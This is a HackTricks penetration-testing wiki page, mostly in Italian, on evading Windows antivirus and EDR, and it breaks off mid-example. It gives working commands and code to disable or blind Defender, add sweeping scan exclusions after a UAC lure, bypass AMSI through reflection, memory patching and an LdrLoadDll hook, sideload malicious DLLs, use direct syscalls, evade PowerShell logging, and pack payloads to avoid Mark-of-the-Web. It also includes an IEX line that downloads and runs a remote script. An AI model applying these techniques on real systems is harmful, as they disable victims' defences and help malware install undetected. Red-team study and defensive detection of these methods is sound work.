# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata inizialmente scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per interrompere il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per interrompere il funzionamento di Windows Defender fingendo un altro AV.
- [Disabilita Defender se sei admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di gioco spesso vengono distribuiti come installer non firmati Node.js/Nexe che prima **chiedono all'utente l'elevazione** e solo dopo disattivano Defender. Il flusso è semplice:

1. Verificare il contesto amministrativo con `net session`. Il comando ha successo solo quando il chiamante possiede diritti di amministratore, quindi un fallimento indica che il loader è in esecuzione come utente standard.
2. Rilanciare immediatamente se stesso con il verbo `RunAs` per scatenare il previsto prompt di consenso UAC preservando la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di star installando software “cracked”, quindi il prompt viene solitamente accettato, concedendo al malware i diritti necessari per modificare la policy di Defender.

### Esclusioni generali `MpPreference` per ogni lettera di unità

Una volta elevati i privilegi, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare completamente il servizio. Il loader prima uccide il GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) e poi applica **esclusioni estremamente ampie** in modo che ogni profilo utente, directory di sistema e disco rimovibile diventino non scansionabili:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop scans ogni filesystem montato (D:\, E:\, USB sticks, ecc.) quindi **qualsiasi payload futuro lasciato da qualche parte sul disco viene ignorato**.
- L'esclusione per l'estensione `.sys` è lungimirante—gli attacker si riservano l'opzione di caricare driver non firmati più avanti senza dover toccare Defender di nuovo.
- Tutte le modifiche vengono inserite sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permettendo alle fasi successive di confermare che le esclusioni persistono o di espanderle senza riattivare UAC.

Poiché nessun servizio di Defender viene fermato, controlli di integrità ingenui continuano a riportare “antivirus active” anche se l'ispezione in tempo reale non tocca mai quei percorsi.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection si ottiene segnalando stringhe note o array di byte in un binary o script, e anche estraendo informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti beccare più facilmente, dato che probabilmente sono già stati analizzati e segnalati come malicious. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se cripta il binary, non ci sarà modo per gli AV di rilevare il tuo programma, ma avrai bisogno di qualche tipo di loader per decrittare ed eseguire il programma in memory.

- **Obfuscation**

A volte tutto ciò che serve è cambiare alcune strings nel tuo binary o script per farla franca con l'AV, ma questo può richiedere tempo a seconda di cosa stai cercando di obfuscate.

- **Custom tooling**

Se sviluppi i tuoi strumenti, non ci saranno signature conosciute, ma questo richiede molto tempo e sforzo.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ti consiglio vivamente di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) su AV Evasion pratico.

### **Dynamic analysis**

Dynamic analysis è quando l'AV esegue il tuo binary in una sandbox e osserva attività malicious (es. provare a decriptare e leggere le password del browser, fare un minidump su LSASS, ecc.). Questa parte può essere più difficile da aggirare, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis degli AV. Gli AV hanno un tempo molto breve per analizzare i file per non interrompere il workflow dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binary. Il problema è che molte sandbox degli AV possono semplicemente saltare il sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le Sandbox hanno risorse molto limitate a disposizione (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Qui puoi anche diventare creativo, per esempio controllando la temperatura della CPU o anche la velocità delle ventole, non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente la cui workstation è joinata al dominio "contoso.local", puoi fare un check sul dominio del computer per vedere se corrisponde a quello che hai specificato; se non corrisponde, puoi far terminare il tuo programma.

Si scopre che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione; se il nome corrisponde a HAL9TH, significa che sei dentro la defender's sandbox, quindi puoi far terminare il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come detto prima in questo post, **public tools** verranno prima o poi **rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, **do you really need to use mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto e che fa comunque il dump di LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, probabilmente è uno dei, se non il pezzo di malware più segnalato dagli AVs e dagli EDRs; pur essendo un progetto molto interessante, è anche un incubo usarlo per eludere gli AV, quindi cerca semplicemente alternative per quello che vuoi ottenere.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i DLL files per essere molto più stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima sia i payload malicious uno accanto all'altro.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando mostrerà l'elenco dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**, questa tecnica è abbastanza stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable pubblicamente noti, potresti essere facilmente scoperto.

Il semplice fatto di posizionare una DLL malevola con il nome che un programma si aspetta di caricare non farà eseguire il tuo payload, perché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (maligna) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 in [antiscan.me](https://antiscan.me)! Lo considererei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Consiglio **caldamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [il video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire ulteriormente quanto abbiamo discusso.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è un KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copy-paste):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona un `NCRYPTPROV.dll` malevolo nella stessa cartella. Un DllMain minimale è sufficiente per ottenere code execution; non è necessario implementare la forwarded function per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Innesca l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) carica la side-by-side `keyiso.dll` (signed)
- Mentre risolve `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader poi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Hunting tips:
- Concentrati sulle export inoltrate (forwarded exports) dove il modulo di destinazione non è una KnownDLL. Le KnownDLLs sono elencate sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare le export inoltrate con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Vedi l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitorare LOLBins (es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Segnalare catene processo/modulo come: `rundll32.exe` → non di sistema `keyiso.dll` → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applicare policy di integrità del codice (WDAC/AppLocker) e negare permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion è solo un gioco del gatto e del topo: quello che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo tool; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs spesso piazzano **user-mode inline hooks** su `ntdll.dll` syscall stubs. Per bypassare quei hook, puoi generare syscall stub **direct** o **indirect** che caricano il corretto **SSN** (System Service Number) e fanno la transizione in kernel mode senza eseguire l'export entrypoint hookato.

**Opzioni di invocazione:**
- **Direct (embedded)**: emettere un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun hit sull'export di `ntdll`).
- **Indirect**: saltare in un gadget `syscall` esistente dentro `ntdll` così la transizione al kernel sembra originare da `ntdll` (utile per evasione euristica); **randomized indirect** sceglie un gadget da un pool per ogni chiamata.
- **Egg-hunt**: evitare di incorporare la sequenza di opcode statica `0F 05` su disco; risolvere la sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti ai hook:**
- **FreshyCalls (VA sort)**: inferire gli SSN ordinando gli syscall stub per virtual address invece di leggere i byte dello stub.
- **SyscallsFromDisk**: mappare un `\KnownDlls\ntdll.dll` pulito, leggere gli SSN dalla sua `.text`, poi unmapparlo (aggira tutti gli hook in memoria).
- **RecycledGate**: combinare l'inferenza SSN ordinata per VA con la validazione degli opcode quando uno stub è clean; fallback all'inferenza per VA se è hookato.
- **HW Breakpoint**: impostare DR0 sull'istruzione `syscall` e usare una VEH per catturare lo SSN da `EAX` a runtime, senza parsare i byte hookati.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AVs erano in grado di eseguire la scansione solo dei **file su disco**, quindi se si riusciva in qualche modo a eseguire payload **directly in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, o installazione ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Office VBA macros

Permette alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma non crittografata e non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati directly in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, il codice C# viene anch'esso eseguito attraverso AMSI. Questo influenza persino `Assembly.Load(byte[])` per il caricamento directly in-memory. Per questo motivo si raccomanda l'uso di versioni più vecchie di .NET (come la 4.7.2 o inferiori) per l'esecuzione directly in-memory se si vuole eludere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevazioni statiche, modificare gli script che si cerca di caricare può essere un buon modo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di deobfuscate gli script anche se hanno più livelli, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo la rende non così semplice da eludere. Anche se a volte tutto ciò che serve è cambiare un paio di nomi di variabili e funziona, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedire un uso più esteso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per l'attuale powershell process. Questa riga è stata, ovviamente, rilevata dallo stesso AMSI, quindi sono necessarie alcune modifiche per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Schema di implementazione (pseudocodice x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona su PowerShell, WScript/CScript e loader personalizzati allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio di script via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti di riga di comando lunghi.
- Visto utilizzato da loader eseguiti tramite LOLBins (ad es., `regsvr32` che chiama `DllRegisterServer`).

Lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera inoltre script per bypassare AMSI.
Lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera inoltre script per bypassare AMSI che evitano la firma tramite funzioni definite dall'utente, variabili ed espressioni di caratteri randomizzate e applicano una capitalizzazione casuale alle parole chiave di PowerShell per eludere la firma.

**Rimuovi la firma rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la firma AMSI rilevata dalla memoria del processo corrente. Questo strumento opera scansionando la memoria del processo corrente alla ricerca della firma AMSI e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare una lista di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di auditing e troubleshooting, ma può anche essere un **problema per gli attacker che vogliono eludere il rilevamento**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) to spawn a powershell withuot defenses (this is what `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> Diverse tecniche di obfuscation si basano sulla cifratura dei dati, il che aumenterà l'entropia del binario rendendolo più facile da rilevare per AVs e EDRs. Fai attenzione a questo e considera di applicare la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o che devono essere nascoste.

### Deoffuscazione di binari .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune incontrare diversi strati di protezione che bloccheranno i decompilatori e le sandbox. La procedura seguente ripristina in modo affidabile un IL quasi originale che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx cifra ogni *method body* e lo decifra all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo inoltre modifica il checksum PE, quindi qualsiasi modifica farà crashare il binario. Usa **AntiTamperKiller** per individuare le tabelle di metadata cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando si costruisce un proprio unpacker.

2.  Symbol / control-flow recovery – passa il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleziona il profilo ConfuserEx 2  
• de4dot annullerà il control-flow flattening, ripristinerà gli namespace originali, le classi e i nomi delle variabili e decritterà le stringhe costanti.

3.  Proxy-call stripping – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (a.k.a *proxy calls*) per complicare ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti vedere API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Manual clean-up – esegui il binario risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il payload *reale*. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** necessità di eseguire il campione maligno – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a compile time, obfuscated code senza usare strumenti esterni e senza modificare il compiler.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di C++ template metaprogramming che rende la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di offuscare diversi tipi di PE file inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice metamorphic code engine per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di fine-grained code obfuscation per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni normali in ROP chains, ostacolando la nostra naturale concezione del normale controllo di flusso.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da internet ed li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate raramente attiveranno SmartScreen avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al momento del download di file da internet, insieme con l'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo del Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ottengano il Mark of The Web è confezionarli all'interno di qualche tipo di container come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta payload in output container per eludere Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
